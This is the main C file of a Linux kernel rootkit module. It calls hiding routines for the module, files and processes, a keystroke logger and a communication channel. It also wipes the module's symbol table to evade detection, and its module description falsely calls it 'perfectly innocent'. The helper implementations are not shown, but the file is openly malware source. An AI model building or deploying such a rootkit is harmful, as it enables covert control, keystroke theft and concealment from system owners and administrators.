//TODO: put init macros back..
//TODO: extract kprintfs to one file to make them easier to enable / disable

// passing parameters http://www.tldp.org/HOWTO/html_single/Module-HOWTO/



#include <linux/module.h>	 // For moduless
#include <linux/init.h>	

#include "common.h"
#include "logInput.h"
#include "moduleHide.h"
#include "fileHide.h"
#include "communicationOutput.h"
#include "processHider.h"
#include "communication.h"


// can get adddress of syscalls not exported using something on http://onebitbug.me/2011/03/04/introducing-linux-kernel-symbols/


//TODO: rename this to if wanting to be able to remove rootkit
#define DEV_MODE

//TODO: check if when an init function fails that the parts of the rootkit which were installed are removed.
static int __init main_init(void) {
	
	int error;
	printInfo("Installing rootkit. Compiled: %s %s\n", __TIME__, __DATE__); // TODO: print time etc..

	error = communication_init(); 	// probably should ensure process hider init has finished.. before this is called..
	if (error) return error;


#ifndef DEV_MODE
	error = moduleHide_start();
	if (error) return error;
	
	error = logInput_init();
	if (error) return error;
#endif

	error = fileHide_start();
	if (error) return error;
	
	error = processHider_init();
	if (error) return error;

	printInfo("Rootkit installed\n");
	
	__this_module.num_symtab = 0;
	
	return 0;
}

//TODO: have things end in the reverse order to what they start in
static void __exit main_exit(void) {
	
 	fileHide_stop();
#ifndef DEV_MODE
   moduleHide_stop();
	logInput_exit();
#endif
	processHider_exit();

	communication_exit();

	printInfo("Rootkit uninstalled\n");
}



// Get rid of taint message
MODULE_LICENSE("GPL"); // note: GPL is required if using the functions create_class / create_device.. (http://forums.fedoraforum.org/showthread.php?t=97742)
MODULE_AUTHOR("Innocent authors");
MODULE_DESCRIPTION("This is a perfectly innocent module and has nothing to do with rootkits whatsoever :)");

//http://www.krystalcraft.cz/projects/linux_kernel_rootkit/doc/load.html


module_init(main_init);
module_exit(main_exit);	 // For init macros
//#include <linux/tty.h> /* console_print() interface */
